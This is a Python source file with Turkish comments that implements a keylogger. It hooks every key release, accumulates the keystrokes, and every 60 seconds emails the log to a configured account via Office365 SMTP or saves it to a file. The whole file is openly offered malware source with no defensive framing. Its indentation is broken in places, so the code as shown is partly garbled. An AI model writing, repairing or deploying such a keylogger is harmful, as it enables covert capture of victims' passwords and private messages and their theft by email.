import keyboard # klavye kayitlarini kaydetmek icin
import smtplib #smtp protokolu araciligiyla e-posta gonderme
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
SEND_REPORT_EVERY = 60 #saniye
EMAIL_ADDRESS = "e-posta adresiniz"
EMAIL_PASSWORD = "sifreniz"

class Keylogger:
 def __init__(self, interval, report_method="email"):
# SEND_REPORT_EVERY degiskenini interval olarak gececegiz
self.interval = interval
self.report_method = report_method
# self.interval icindeki tum tus vuruslarininn kaydinin bulundugu string degiskeni
self.log =""
# baslangic ve bitis tarih saatlerini kaydedin
self.start_dt = datetime.now()
self.end_dt = datetime.now()
def callback(self, event):
  
    """
    Bu callback, herhangi bir klavye olayi meydana geldiginde cagirilir
    (bu ornekte bir tus serbest birakildiginda)
    """
    ad = event.name
    if len(ad) > 1:
        # karakter degil, ozel bir tus (ornegin, ctrl, alt, vb.)
        # [] icinde buyuk harfle yazilir
        if ad == "space":
            # "space" yerine " " kullan
            ad = " "
        elif ad == "enter":
            # ENTER tusuna basildiginda yeni bir satir ekler
            ad = "[ENTER]\n"
        elif ad == "decimal":
            ad = "."
        else:
            # bosluklari alt cizgiyle degistir
            ad = ad.replace(" ", "_")
            ad = f"[{ad.upper()}]"
    # son olarak, tus adini global `self.log` degiskenimize ekleyin
    self.log += ad
    def update_filename(self):
        # baslangic ve bitis tarihlerine gore tanimlanacak dosya adini olusturun     
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """Bu yontem, gecerli dizinde bir gunluk dosyasi olusturur. "self.log" degiskenindeki gecerli keyloglar"""
        # dosyayi yazma modunda acin
        with open(f"{self.filename}.txt", "w") as f:
            # keylog'lari dosyaya yaz
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
    
    def prepare_mail(self, message):
        """Bir metinden bir MIMEMultipart olusturmak icin yardimci fonksiyon
            Metin surumunun yani sira bir HTML surumu de olusturur
              e-posta olarak gonderilecek"""
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        # ornek paragraf istediginizi yazabilirsiniz
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        # maili hazirladiktan sonra stringe cevirelim
        return msg.as_string()
    
    def sendmail(self, email, password, message, verbose=1):
        # bir SMTP sunucusunda baglantiyi yonetir
        # Bizim durumumuzda Microsoft365, Outlook, Hotmail ve live.com içindir
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        # SMTP sunucusuna TLS modu olarak bağlanın (güvenlik için)
        server.starttls()
        # e-posta hesabına giris
        server.login(email, password)
        # hazırlıktan sonra asil mesaji gönderir
        server.sendmail(email, email, self.prepare_mail(message))
        # oturumu sonlandirir
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")

    def report(self):
        """
        Bu islev her `self.interval`de cagirilir
          Temel olarak keylog gonderir ve `self.log` degiskenini sifirlar
        """
        if self.log:
            # gunlukte bir sey varsa, rapor edin
            self.end_dt = datetime.now()
            # `self.filename` guncellemesi
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # is parcacigini daemon olarak ayarlayin
        timer.daemon = True
        # zamanlayiciyi baslatin
        timer.start()
    def start(self):
        # baslangic zamanini kaydedin
        self.start_dt = datetime.now()
        # keylogger baslat
        keyboard.on_release(callback=self.callback)
        # tus vuruslari kaydedilmeye baslar
        self.report()
        # basit bir mesaj olustur
        print(f"{datetime.now()} - Started keylogger")
        # gecerli is parcasini engeller. ctrl+c basana kadar bekler
        keyboard.wait()
if __name__ == "__main__":
    # eger vuruslari dosya olarak kaydetmek istersen asagiya "file"
    # eger vuruslar sana mail yoluyla gelsin istersen "email" olarak degistir
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    keylogger.start()

    
